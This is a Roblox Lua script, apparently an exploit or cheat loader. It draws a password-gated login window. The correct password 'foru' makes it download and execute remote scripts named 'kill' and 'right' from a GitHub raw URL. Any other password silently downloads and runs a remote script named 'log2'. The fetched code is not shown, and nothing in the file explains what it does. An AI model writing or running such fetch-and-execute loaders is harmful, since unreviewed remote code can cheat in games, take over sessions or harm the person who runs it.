-- Gui to Lua
-- Version: 3.2

-- Instances:

local Login = Instance.new("ScreenGui")
local Grah = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local password = Instance.new("TextBox")
local UICorner_2 = Instance.new("UICorner")
local Log = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")

--Properties:

Login.Name = "Login"
Login.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Login.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Grah.Name = "Grah"
Grah.Parent = Login
Grah.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Grah.Position = UDim2.new(0.263926953, 0, 0.284580499, 0)
Grah.Size = UDim2.new(0, 338, 0, 147)

UICorner.Parent = Grah

password.Name = "password"
password.Parent = Grah
password.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
password.Position = UDim2.new(0.204142004, 0, 0.108843535, 0)
password.Size = UDim2.new(0, 200, 0, 50)
password.Font = Enum.Font.Arial
password.Text = "password..."
password.TextColor3 = Color3.fromRGB(255, 255, 255)
password.TextSize = 20.000

UICorner_2.Parent = password

Log.Name = "Log"
Log.Parent = Grah
Log.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
Log.Position = UDim2.new(0.204142019, 0, 0.571428597, 0)
Log.Size = UDim2.new(0, 200, 0, 44)
Log.Font = Enum.Font.Arial
Log.Text = "LOGIN"
Log.TextColor3 = Color3.fromRGB(255, 255, 255)
Log.TextSize = 23.000
Log.MouseButton1Click:Connect(function()
	if password.Text == "foru" then
		Login:Destroy()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/kill'))()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/right'))()
	else
		loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/log2'))()
	end
end)

UICorner_3.Parent = Log

-- Scripts:

local function JZCH_fake_script() -- Grah.Script 
	local script = Instance.new('Script', Grah)

	local Grah = script.Parent
	
	Grah.Active = true
	Grah.Draggable = true
end
coroutine.wrap(JZCH_fake_script)()
